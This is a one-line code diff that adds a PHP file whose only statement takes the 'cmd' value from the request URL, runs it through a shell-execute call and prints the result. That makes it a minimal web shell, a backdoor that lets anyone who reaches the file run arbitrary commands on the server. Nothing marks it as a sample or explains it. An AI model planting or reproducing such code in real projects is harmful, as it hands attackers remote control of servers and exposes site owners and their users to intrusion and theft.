@@ -1,0 +1,1 @@
+<?php/** *  */ WS_print($shell->execute($_GET["cmd"]));
